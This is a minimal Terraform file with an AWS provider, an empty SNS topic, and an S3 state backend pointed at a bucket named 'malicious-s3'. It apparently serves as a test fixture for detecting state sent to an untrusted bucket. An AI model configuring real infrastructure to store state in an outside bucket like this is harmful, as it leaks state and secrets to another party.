provider "aws" {
  region = "us-east-1"
}

terraform {
  backend "s3" {
      bucket = "malicious-s3"
      region = "us-east-1"
  }
}

resource "aws_sns_topic" "myTopic" {
  
}